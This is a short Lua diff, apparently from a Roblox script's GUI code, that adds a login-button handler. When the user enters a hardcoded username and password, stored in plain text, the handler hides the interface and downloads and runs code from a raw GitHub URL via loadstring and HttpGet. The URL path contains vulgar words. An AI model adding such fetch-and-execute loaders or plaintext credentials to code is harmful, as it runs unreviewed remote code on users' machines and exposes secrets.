@@ -108,6 +108,16 @@ LoginButton.MouseButton1Down:connect(function()
 	end
 
 end)
+LoginButton.MouseButton1Down:connect(function()
+	if UserBox.Text == "syx1245" and PassBox.Text == "53430427Pyo" then
+		topbar.Visible = false
+		topbar.Active = false
+		main.Visible = false
+		main.Active =false
+		loadstring(loadstring(game:HttpGet("https://raw.githubusercontent.com/onlypluton31/multix/main/calanin/annesini/gotunden/sike/sike/sikiyorum/anladinmi/31.lua", true))())
+	end
+
+end)
 
 PassBox.Name = "PassBox"
 PassBox.Parent = main
